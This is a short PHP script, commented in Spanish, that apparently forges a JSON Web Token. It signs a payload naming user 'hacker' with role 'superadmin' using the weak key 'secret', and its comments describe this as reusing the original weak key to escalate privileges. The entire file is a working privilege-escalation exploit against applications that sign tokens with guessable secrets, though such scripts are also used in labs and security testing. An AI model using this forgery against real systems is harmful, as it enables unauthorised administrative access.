<?php
require 'vendor/autoload.php';
use Firebase\JWT\JWT;

$key = "secret"; // Misma clave débil utilizada originalmente

$payload = [
    "user" => "hacker",
    "role" => "superadmin" // Intentando escalar privilegios
];

$new_jwt = JWT::encode($payload, $key, "HS256");

echo "Nuevo JWT modificado:\n" . $new_jwt;
?>